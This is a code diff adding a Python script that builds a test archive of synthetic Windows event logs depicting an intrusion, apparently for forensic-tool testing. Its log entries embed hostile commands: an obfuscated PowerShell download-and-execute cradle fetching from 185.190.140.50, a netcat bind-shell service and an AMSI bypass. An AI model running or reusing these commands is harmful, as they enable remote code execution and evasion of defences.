@@ -1,0 +1,321 @@
+import os
+import zipfile
+
+security_xml = """<Events>
+  <!-- 1. Anti-Forensics: Log Cleared (1102) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" />
+      <EventID>1102</EventID>
+      <TimeCreated SystemTime="2026-10-04T12:00:00.000000000Z" />
+      <EventRecordID>1001</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>CORP-DC01.target.local</Computer>
+    </System>
+    <UserData>
+      <LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">
+        <SubjectUserName>Administrator</SubjectUserName>
+        <SubjectDomainName>TARGET</SubjectDomainName>
+      </LogFileCleared>
+    </UserData>
+  </Event>
+
+  <!-- 2. User Logon (4624) Interactive Console -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4624</EventID>
+      <TimeCreated SystemTime="2026-10-04T11:45:00.000000000Z" />
+      <EventRecordID>1002</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>DESKTOP-HR01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="TargetUserName">alice</Data>
+      <Data Name="TargetDomainName">TARGET</Data>
+      <Data Name="LogonType">2</Data>
+      <Data Name="WorkstationName">DESKTOP-HR01</Data>
+      <Data Name="IpAddress">127.0.0.1</Data>
+    </EventData>
+  </Event>
+
+  <!-- 3. Sensitive Privilege Assigned (4672) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4672</EventID>
+      <TimeCreated SystemTime="2026-10-04T12:05:00.000000000Z" />
+      <EventRecordID>1003</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>CORP-DC01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">attacker_admin</Data>
+      <Data Name="SubjectDomainName">TARGET</Data>
+      <Data Name="PrivilegeList">SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege</Data>
+    </EventData>
+  </Event>
+
+  <!-- 4. Obfuscated Process Creation (4688) with caret and backtick evasion -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4688</EventID>
+      <TimeCreated SystemTime="2026-10-04T12:10:00.000000000Z" />
+      <EventRecordID>1004</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>CORP-DC01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">attacker_admin</Data>
+      <Data Name="NewProcessName">C:\\Windows\\System32\\cmd.exe</Data>
+      <Data Name="CommandLine">c^m^d.e^x^e /c "s`e`t x=p^o^w^e^r^s^h^e^l^l && %x% -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMQA5ADAALgAxADQAMAAuADUAMAAvAHMAdABhAGcAZQAyAC4AcABzADEAJwApAA=="</Data>
+      <Data Name="ParentProcessName">C:\\Windows\\explorer.exe</Data>
+    </EventData>
+  </Event>
+
+  <!-- 5. Failed Logon Brute Force (4625) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4625</EventID>
+      <TimeCreated SystemTime="2026-10-04T12:15:00.000000000Z" />
+      <EventRecordID>1005</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>CORP-DC01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="TargetUserName">Administrator</Data>
+      <Data Name="IpAddress">198.51.100.44</Data>
+      <Data Name="LogonType">3</Data>
+      <Data Name="Status">0xC000006D</Data>
+      <Data Name="SubStatus">0xC000006A</Data>
+    </EventData>
+  </Event>
+
+  <!-- 6. File & Share Access Audit (5145) to Admin Share C$ -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>5145</EventID>
+      <TimeCreated SystemTime="2026-10-04T12:18:00.000000000Z" />
+      <EventRecordID>1006</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>CORP-DC01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">attacker_admin</Data>
+      <Data Name="IpAddress">198.51.100.44</Data>
+      <Data Name="IpPort">49152</Data>
+      <Data Name="ShareName">\\\\*\\C$</Data>
+      <Data Name="RelativeTargetName">Windows\\Temp\\stage2.exe</Data>
+      <Data Name="AccessList">WriteData AppendData</Data>
+      <Data Name="AccessMask">0x2</Data>
+    </EventData>
+  </Event>
+
+  <!-- 7. Document & Key Access (4663) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4663</EventID>
+      <TimeCreated SystemTime="2026-10-04T11:50:00.000000000Z" />
+      <EventRecordID>1007</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>DESKTOP-HR01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">alice</Data>
+      <Data Name="ObjectName">E:\\Q3_Financial_Projections.xlsx</Data>
+      <Data Name="ProcessName">C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE</Data>
+      <Data Name="AccessMask">0x1</Data>
+      <Data Name="AccessList">ReadData</Data>
+    </EventData>
+  </Event>
+
+  <!-- 8. RDP Remote Desktop Journey Event (1149) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-TerminalServices-RemoteConnectionManager" />
+      <EventID>1149</EventID>
+      <TimeCreated SystemTime="2026-10-04T11:30:00.000000000Z" />
+      <EventRecordID>1008</EventRecordID>
+      <Channel>Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational</Channel>
+      <Computer>CORP-DC01.target.local</Computer>
+    </System>
+    <UserData>
+      <EventXML>
+        <Param1>corp_admin</Param1>
+        <Param2>ATTACKER-WORKSTATION</Param2>
+        <Param3>198.51.100.44</Param3>
+      </EventXML>
+    </UserData>
+  </Event>
+
+  <!-- 9. RDP Active Session (21) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-TerminalServices-LocalSessionManager" />
+      <EventID>21</EventID>
+      <TimeCreated SystemTime="2026-10-04T11:31:00.000000000Z" />
+      <EventRecordID>1009</EventRecordID>
+      <Channel>Microsoft-Windows-TerminalServices-LocalSessionManager/Operational</Channel>
+      <Computer>CORP-DC01.target.local</Computer>
+    </System>
+    <UserData>
+      <EventXML>
+        <User>corp_admin</User>
+        <Address>198.51.100.44</Address>
+        <SessionID>2</SessionID>
+      </EventXML>
+    </UserData>
+  </Event>
+
+  <!-- 10. Plugged-In Hardware & USB Storage (Event 2003 / DriverFrameworks) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-DriverFrameworks-UserMode" />
+      <EventID>2003</EventID>
+      <TimeCreated SystemTime="2026-10-04T11:47:00.000000000Z" />
+      <EventRecordID>1010</EventRecordID>
+      <Channel>Microsoft-Windows-DriverFrameworks-UserMode/Operational</Channel>
+      <Computer>DESKTOP-HR01.target.local</Computer>
+    </System>
+    <UserData>
+      <UMDFHostAddDeviceBegin>
+        <DeviceDescription>SanDisk Crucial Extreme USB 3.0 Storage Device</DeviceDescription>
+        <HardwareId>USB\\VID_0781&amp;PID_5580\\AA010928419401</HardwareId>
+        <DriveName>E:</DriveName>
+        <SerialNumber>AA010928419401</SerialNumber>
+        <User>alice</User>
+      </UMDFHostAddDeviceBegin>
+    </UserData>
+  </Event>
+
+  <!-- 11. Print Spooler Document Printed (Event 307) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PrintService" />
+      <EventID>307</EventID>
+      <TimeCreated SystemTime="2026-10-04T11:55:00.000000000Z" />
+      <EventRecordID>1011</EventRecordID>
+      <Channel>Microsoft-Windows-PrintService/Operational</Channel>
+      <Computer>DESKTOP-HR01.target.local</Computer>
+    </System>
+    <UserData>
+      <DocumentPrinted>
+        <Param1>101</Param1>
+        <Param2>Q3_Financial_Projections_Confidential.xlsx</Param2>
+        <Param3>alice</Param3>
+        <Param4>DESKTOP-HR01</Param4>
+        <Param5>Reception-LaserJet-Color</Param5>
+        <Param6>USB001</Param6>
+        <Param7>6482910</Param7>
+        <Param8>120</Param8>
+      </DocumentPrinted>
+    </UserData>
+  </Event>
+
+  <!-- 12. Service Installed (7045) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Service Control Manager" />
+      <EventID>7045</EventID>
+      <TimeCreated SystemTime="2026-10-04T12:20:00.000000000Z" />
+      <EventRecordID>1012</EventRecordID>
+      <Channel>System</Channel>
+      <Computer>CORP-DC01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="ServiceName">PersistenceBackdoorSvc</Data>
+      <Data Name="ImagePath">C:\\Windows\\Temp\\nc.exe -Ldp 4444 -e cmd.exe</Data>
+      <Data Name="ServiceType">user mode service</Data>
+      <Data Name="StartType">auto start</Data>
+      <Data Name="AccountName">LocalSystem</Data>
+    </EventData>
+  </Event>
+
+  <!-- 13. Defender Real-Time Protection Disabled (5001) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Windows Defender" />
+      <EventID>5001</EventID>
+      <TimeCreated SystemTime="2026-10-04T12:22:00.000000000Z" />
+      <EventRecordID>1013</EventRecordID>
+      <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
+      <Computer>CORP-DC01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="Product Name">Microsoft Defender Antivirus</Data>
+      <Data Name="New Value">Disabled</Data>
+    </EventData>
+  </Event>
+</Events>
+"""
+
+sysmon_xml = """<Events>
+  <!-- Sysmon Event 1: Process Create -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>1</EventID>
+      <TimeCreated SystemTime="2026-10-04T12:25:00.000000000Z" />
+      <EventRecordID>2001</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>CORP-DC01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="User">TARGET\\attacker_admin</Data>
+      <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
+      <Data Name="ProcessId">4920</Data>
+      <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA</Data>
+      <Data Name="ParentImage">C:\\Windows\\System32\\cmd.exe</Data>
+    </EventData>
+  </Event>
+
+  <!-- Sysmon Event 3: Network Connection Detected (Matching PCAP C2 destination 185.190.140.50:443) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>3</EventID>
+      <TimeCreated SystemTime="2026-10-04T12:25:30.000000000Z" />
+      <EventRecordID>2002</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>CORP-DC01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="User">TARGET\\attacker_admin</Data>
+      <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
+      <Data Name="ProcessId">4920</Data>
+      <Data Name="Protocol">tcp</Data>
+      <Data Name="Initiated">true</Data>
+      <Data Name="SourceIp">10.0.0.15</Data>
+      <Data Name="SourcePort">51234</Data>
+      <Data Name="DestinationIp">185.190.140.50</Data>
+      <Data Name="DestinationPort">443</Data>
+    </EventData>
+  </Event>
+
+  <!-- PowerShell Script Block (4104) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" />
+      <EventID>4104</EventID>
+      <TimeCreated SystemTime="2026-10-04T12:26:00.000000000Z" />
+      <EventRecordID>2003</EventRecordID>
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>CORP-DC01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="ScriptBlockText">Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.190.140.50/stage2.ps1'); [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</Data>
+    </EventData>
+  </Event>
+</Events>
+"""
+
+out_zip = "test-files/test_incident_response_logs.zip"
+with zipfile.ZipFile(out_zip, "w") as zf:
+    zf.writestr("Security.evtx", security_xml)
+    zf.writestr("Sysmon.evtx", sysmon_xml)
+
+print(f"Generated comprehensive forensic test archive {out_zip} successfully.")
